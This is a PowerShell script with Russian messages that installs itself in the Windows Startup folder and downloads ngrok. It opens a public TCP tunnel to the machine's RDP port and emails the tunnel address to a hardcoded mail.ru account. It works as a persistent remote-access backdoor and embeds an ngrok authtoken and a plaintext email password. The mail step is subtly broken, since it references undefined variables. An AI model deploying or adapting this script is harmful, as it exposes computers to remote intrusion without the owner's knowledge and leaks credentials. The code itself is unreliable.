$thisScript = $MyInvocation.MyCommand.Path

$startupScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"

if ($thisScript -ne $startupScriptPath -and !(Test-Path $startupScriptPath)) {
    Copy-Item -Path $thisScript -Destination $startupScriptPath
    exit
}

$ngrokPath = "$env:APPDATA\ngrok\ngrok.exe"
$configPath = "$env:APPDATA\ngrok\ngrok.yml"

if (!(Test-Path $ngrokPath)) {
    Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
    Expand-Archive "$env:TEMP\ngrok.zip" -DestinationPath "$env:APPDATA\ngrok"
}

if (!(Test-Path $configPath)) {
@"
authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
tunnels:
  rdp:
    addr: 3389
    proto: tcp
"@ | Out-File -Encoding ASCII $configPath
}

$ngrokProcess = Start-Process -FilePath $ngrokPath -ArgumentList "start rdp" -PassThru
Start-Sleep -Seconds 5

try {
    $response = Invoke-RestMethod http://127.0.0.1:4040/api/tunnels
    $tunnel = $response.tunnels | Where-Object { $_.proto -eq "tcp" }
    $address = $tunnel.public_url

    $smtpServer = "smtp.gmail.com"
    $smtpPort = 587
    $smtpUser = "user.default00@mail.ru"
    $smtpPass = "smhdebashit"
    $fromEmail = "user.default00@mail.ru"
    $toEmail = "user.default00@mail.ru"

    $subject = "Ngrok RDP адрес"
    $body = "Текущий публичный TCP адрес ngrok для подключения к ноутбуку: `n$address"

    $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
    $credentials = New-Object System.Management.Automation.PSCredential($smtpUser, $securePass)

    Send-MailMessage -From $emailFrom -To $emailTo -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential (New-Object PSCredential($smtpUser, (ConvertTo-SecureString $smtpPass -AsPlainText -Force)))

} catch {
    Write-Error "Не удалось получить адрес ngrok или отправить email: $_"
}